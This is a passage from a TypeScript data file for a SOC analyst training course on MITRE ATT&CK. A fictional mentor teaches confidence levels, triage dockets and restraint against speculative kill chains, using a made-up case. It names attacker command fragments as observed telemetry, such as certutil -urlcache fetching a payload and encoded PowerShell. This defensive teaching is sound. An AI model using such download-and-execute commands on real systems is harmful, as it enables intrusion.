    sub: 'Behavioral Pattern Observed; Partial Payload Available',
    badge: 'SUSPECTED (MED)',
    description: 'Behavioral telemetry indicates technique execution, but partial parameters are obfuscated or external network connection dropped before payload arrival.',
    details: 'Ananya explains: "Suspected means we saw certutil -urlcache reach out, but firewall RST dropped the connection before the payload transferred."',
    tags: ['Medium Confidence', 'Suspected TTP', 'Partial Telemetry', 'Connection Dropped'],
  },
  {
    id: 'unc-hypothesized-low',
    label: '3. Hypothesized Lead (Low Confidence)',
    sub: 'Anomalous Signal; Working Lead Pending L2 Forensics',
    badge: 'HYPOTHESIS (LOW)',
    description: 'A working investigative hypothesis: unusual network beacon cadence or encrypted egress matching C2 patterns without decoded payload confirmation.',
    details: 'Ananya notes: "Hypothesized is an investigative lead. We observe periodic 45s HTTPS beacons to an unclassified IP. We suspect T1071.001 Web Protocols."',
    tags: ['Low Confidence', 'Working Lead', 'Beacon Cadence', 'Investigation Hook'],
  },
  {
    id: 'unc-ananya-candor-rule',
    label: '4. Ananya\'s Candor Rule',
    sub: 'Transparent Uncertainty is the Hallmark of Elite Analysts',
    badge: 'CANDOR RULE',
    description: 'Accurate reporting of confidence levels prevents senior responders from wasting hours chasing false leads or treating speculations as confirmed facts.',
    details: 'Ananya concludes: "Junior analysts pretend to be 100% certain about everything. Senior analysts clearly document what is proven and what is uncertain."',
    tags: ['Candor Rule', 'Professional Honesty', 'Confidence Matrix', 'Senior Mindset'],
  },
];

// 15. Pillar 3: The Audit-Proof L1 Triage Docket Format
export const auditProofTriageDocketNodes: VisualNodeItem[] = [
  {
    id: 'doc-docket-header',
    label: '1. Case #2026-881 Triage Docket Header',
    sub: 'Host: BLR-BR-WS-04 • User: FIN-OPS-01 • Severity: High',
    badge: 'DOCKET HEADER',
    description: 'Standardized header summarizing incident scope, asset criticality, owning user department, and initial triage disposition.',
    details: 'Ananya instructs: "Case #2026-881 binds finance workstation BLR-BR-WS-04 and clerk user FIN-OPS-01 into a unified investigative docket."',
    tags: ['Case #2026-881', 'Docket Header', 'BLR-BR-WS-04', 'Asset Scope'],
  },
  {
    id: 'doc-technique-matrix',
    label: '2. Structured ATT&CK Mapping Table',
    sub: 'T1059.001 (Confirmed) | T1082 (Confirmed) | T1071.001 (Suspected)',
    badge: 'MAPPING TABLE',
    description: 'Clean tabular presentation mapping each observed behavior to its specific technique ID, telemetry anchor, and confidence qualification.',
    details: 'Ananya notes: "Table lists T1059.001 Confirmed (Sysmon 1), T1082 Confirmed (Sysmon 1), and T1071.001 Suspected (Zeek Conn log)."',
    tags: ['Mapping Table', 'Structured Docket', 'Multi-TTP View', 'Direct Anchors'],
  },
  {
    id: 'doc-confidence-qualifiers',
    label: '3. Evidence Limits & Investigation Gaps',
    sub: 'Documenting What Remains Unchecked or Obfuscated',
    badge: 'EVIDENCE LIMITS',
    description: 'Explicit section highlighting gaps in telemetry: encrypted HTTPS payload content unknown; memory dump pending Tier-2 analysis.',
    details: 'Ananya teaches: "State clearly what is missing: TLS 1.3 payload was encrypted; endpoint memory acquisition required for final verification."',
    tags: ['Telemetry Gaps', 'Encrypted Payload', 'Investigation Bounds', 'Defensible Notes'],
  },
  {
    id: 'doc-ananya-triage-seal',
    label: '4. Ananya\'s Shift Triage Seal',
    sub: 'High-Fidelity Package Ready for Tier-2 Handshake',
    badge: 'TRIAGE SEAL',
    description: 'Shift Lead Ananya inspects the completed ATT&CK mapping docket, verifies evidentiary anchors, and approves handoff to Tier-2 incident response.',
    details: 'Ananya concludes: "This is an audit-proof L1 triage ticket. Tier-2 responders can begin containment immediately without re-investigating the basics."',
    tags: ['Tier-2 Handoff', 'Triage Seal', 'Audit Proof', 'Shift Sign-Off'],
  },
];

// -----------------------------------------------------------------------------
// CHAPTER 6: M13-U3-C2 (Do not infer a full attack chain)
// -----------------------------------------------------------------------------

// 16. Pillar 1: The "Kill Chain Leap" Fallacy (Single Observation ≠ 7-Stage APT)
export const killChainLeapFallacyNodes: VisualNodeItem[] = [
  {
    id: 'lep-single-observation',
    label: '1. The Solitary Observed Fact',
    sub: 'Observation: whoami.exe /priv Executed Once',
    badge: 'OBSERVED FACT',
    description: 'The single verified link in the chain: one process execution event occurred on host BLR-BR-WS-04 at 10:14:22 UTC.',
    details: 'Ananya instructs: "You have exactly ONE verified log event: whoami.exe was executed by user FIN-OPS-01."',
    tags: ['Solitary Fact', 'Single Event', 'whoami.exe', 'Ground Reality'],
  },
  {
    id: 'lep-hallucinated-chain',
    label: '2. The Hallucinated Kill Chain Leap',
    sub: 'Assuming Phish -> Exploit -> C2 -> Exfiltration Occurred',
    badge: 'HALLUCINATED LEAP',
    description: 'The dangerous cognitive leap where an analyst imagines an entire 7-stage attack chain based on a single benign or isolated command.',
    details: 'Ananya cautions: "Do not invent spearphishing emails, memory exploits, and data exfiltration in your ticket when you only observed whoami."',
    tags: ['Kill Chain Leap', 'Premature Inference', 'Hallucinated Links', 'Fatal Bias'],
  },
  {
    id: 'lep-empirical-boundary',
    label: '3. The Empirical SOC Boundary',
    sub: 'Solid Verified Facts vs Missing Speculative Links',
    badge: 'EMPIRICAL BOUNDARY',
    description: 'Enforcing the boundary between observed reality and speculative inference: holding only proven links in the official case record.',
    details: 'Ananya teaches: "Between the observed whoami command and an APT data breach lie six missing links. You cannot assume they exist without evidence."',
    tags: ['Empirical Boundary', 'Verified Facts', 'Missing Links', 'Objective Mindset'],
  },
  {
    id: 'lep-ananya-leap-law',
    label: '4. Ananya\'s Anti-Leap Law',
    sub: 'Document the Links in Your Hands • Never Forge Imaginary Links',
    badge: 'ANTI-LEAP LAW',
    description: 'The golden rule of incident triage: document the facts you hold with verified evidence. Speculating on unobserved attack stages destroys credibility.',
    details: 'Ananya concludes: "Document the links you hold in your hands. Never forge imaginary links in your head. That is the discipline of elite analysts."',
    tags: ['Anti-Leap Law', 'Forensic Discipline', 'Credibility', 'Ananya Principle'],
  },
];

// 17. Pillar 2: Solid Links (Observed Facts) vs Dotted Links (Hypotheses)
export const solidVsDottedLinksNodes: VisualNodeItem[] = [
  {
    id: 'sod-solid-verified-link',
    label: '1. Solid Link: Verified Telemetry Fact',
    sub: 'Sysmon Event 1: powershell.exe -enc (Timestamped)',
    badge: 'SOLID LINK (FACT)',
    description: 'A solid bold line representing an indisputable forensic fact supported by timestamped event logs, process creation, or socket telemetry.',
    details: 'Ananya explains: "Solid links are verified facts: powershell.exe executed with an encoded command at 09:14:02 UTC. Supported by Sysmon 1."',
    tags: ['Solid Link', 'Verified Fact', 'Sysmon Event 1', 'Forensic Ground'],
  },
  {
    id: 'sod-dotted-working-lead',
    label: '2. Dotted Link: Investigative Hypothesis',
    sub: 'Hypothesis: Did Script Establish Persistence in Registry?',
    badge: 'DOTTED LINK (LEAD)',
    description: 'A dashed dotted line representing a working investigative hypothesis: did the PowerShell script modify Run keys or create scheduled tasks?',
    details: 'Ananya teaches: "Dotted links are working leads: we hypothesize that the script attempted persistence. But we do not treat it as fact until verified."',
    tags: ['Dotted Link', 'Working Hypothesis', 'Investigative Lead', 'Unverified'],
  },
  {
    id: 'sod-hypothesis-testing',
    label: '3. Empirical Hypothesis Testing',
    sub: 'Querying Sysmon Event 13 (Registry Value Set)',
    badge: 'HYPOTHESIS TEST',
    description: 'Testing the dotted hypothesis by executing targeted queries against endpoint telemetry: inspecting Registry Event 13 or Scheduled Task Event 4698.',
    details: 'Ananya notes: "We query Sysmon Event 13. If Registry Run key modification is found, the dotted link turns solid! If not, it is pruned."',
    tags: ['Sysmon Event 13', 'Registry Inspection', 'Empirical Test', 'Link Conversion'],
  },
  {
    id: 'sod-ananya-discipline-rule',
    label: '4. Ananya\'s Discipline Rule',
    sub: 'Solid Links Drive Containment • Dotted Links Drive Investigation',
    badge: 'DISCIPLINE RULE',
    description: 'Containment actions (host isolation, credential revocation) must be driven by solid verified facts. Dotted links guide investigative queries.',
    details: 'Ananya concludes: "Contain based on solid links. Hunt based on dotted links. Confusing the two causes catastrophic false containment."',
    tags: ['Discipline Rule', 'Containment Safety', 'Hunting Strategy', 'Elite SOC Standard'],
  },
];

// 18. Pillar 3: Master ATT&CK Certification & Ananya's Supervisory Seal
export const masterAttackSignoffNodes: VisualNodeItem[] = [
  {
    id: 'mas-ttp-taxonomy-mastery',
    label: '1. Complete TTP Taxonomy & Vocabulary Mastery',
    sub: 'Tactics (Why), Techniques (How) & Procedures (What)',
    badge: 'TTP MASTERY',
    description: 'Demonstrated mastery across all 14 tactical categories, granular sub-technique navigation, and LOLBin behavioral evaluation.',
    details: 'Ananya commends: "You have mastered the ATT&CK matrix as an operational language, replacing vendor jargon with empirical technical precision."',
    tags: ['TTP Mastery', '14 Tactics', 'Sub-Techniques', 'LOLBin Mechanics'],
  },
  {
    id: 'mas-anti-speculation-restraint',
    label: '2. Restraint Against Attack Chain Speculation',
    sub: 'Solid Links vs Dotted Leads • Zero Kill Chain Leaps',
    badge: 'RESTRAINT MASTERY',
    description: 'Demonstrated professional discipline: refusing to extrapolate full APT attack chains from isolated commands; documenting uncertainty with complete candor.',
    details: 'Ananya teaches: "Your greatest strength as an analyst is restraint. You map only what telemetry proves, preserving complete forensic integrity."',
    tags: ['Restraint Mastery', 'Anti-Speculation', 'Forensic Candor', 'Evidence Anchors'],
  },
  {
    id: 'mas-case-881-attack-dossier',
    label: '3. Case #2026-881 Completed ATT&CK Dossier',
    sub: 'Full Telemetry Integration: Host WS-04 & User FIN-OPS-01',
    badge: 'CASE #2026-881 DOSSIER',
    description: 'The completed, audit-proof ATT&CK mapping dossier for Central Case #2026-881, perfectly prepared for Tier-2 handoff and Module 14 Incident Response.',
    details: 'Ananya notes: "Case #2026-881 is now fully mapped with irrefutable telemetry anchors: T1059.001, T1082, and T1071.001 ready for incident response."',
    tags: ['Case #2026-881', 'ATT&CK Dossier', 'Tier-2 Ready', 'Complete Package'],
  },
  {
    id: 'mas-ananya-master-seal',
    label: '4. Mentor Ananya\'s Master Supervisory Seal',
    sub: 'Module 13 Certified: MITRE ATT&CK for L1 Analysts',
    badge: 'SUPERVISORY SEAL',
    description: 'Senior Incident Handler Ananya stamps the official CDAC supervisory seal on Module 13, certifying the analyst for advanced incident response in Module 14.',
    details: 'Ananya concludes: "Exceptional work, Apprentice Analyst! You understand that ATT&CK describes mechanics, context determines malice, and evidence anchors are non-negotiable. You are certified in Module 13 and ready for Incident Response & SOC Documentation in Module 14!"',
    tags: ['Supervisory Sign-Off', 'Module 13 Certified', 'Ananya Master Seal', 'Ready for Module 14'],
  },
];

// =============================================================================
// COMPLETE MODULE 13 NODES MAPPING DICTIONARY
// =============================================================================
export const module13NodesMap: Record<string, VisualNodeItem[]> = {
  // Chapter 1: Tactics, techniques and procedures
  'm13-ttp-triad-hierarchy': ttpTriadHierarchyNodes,
  'm13-matrix-navigation-grid': matrixNavigationGridNodes,
  'm13-shared-vocabulary-engine': sharedVocabularyEngineNodes,

  // Chapter 2: Using the matrix as a vocabulary
  'm13-descriptive-not-malice': descriptiveNotMaliceNodes,
  'm13-observable-technique-pipeline': observableTechniquePipelineNodes,
  'm13-dual-use-lolbins-paradox': dualUseLolbinsParadoxNodes,

  // Chapter 3: Credential access and discovery examples
  'm13-credential-access-matrix': credentialAccessMatrixNodes,
  'm13-discovery-ttps-recon': discoveryTtpsReconNodes,
  'm13-discovery-credential-bridge': discoveryCredentialBridgeNodes,

  // Chapter 4: Choose a plausible technique carefully
  'm13-technique-specificity-depth': techniqueSpecificityDepthNodes,
  'm13-plausible-vs-speculative': plausibleVsSpeculativeNodes,
  'm13-evidence-threshold-matrix': evidenceThresholdMatrixNodes,

  // Chapter 5: Evidence and uncertainty
  'm13-evidentiary-anchors-dossier': evidentiaryAnchorsDossierNodes,
  'm13-uncertainty-confidence-levels': uncertaintyConfidenceLevelsNodes,
  'm13-audit-proof-triage-docket': auditProofTriageDocketNodes,

  // Chapter 6: Do not infer a full attack chain
  'm13-kill-chain-leap-fallacy': killChainLeapFallacyNodes,
  'm13-solid-vs-dotted-links': solidVsDottedLinksNodes,
  'm13-master-attack-signoff': masterAttackSignoffNodes,
};
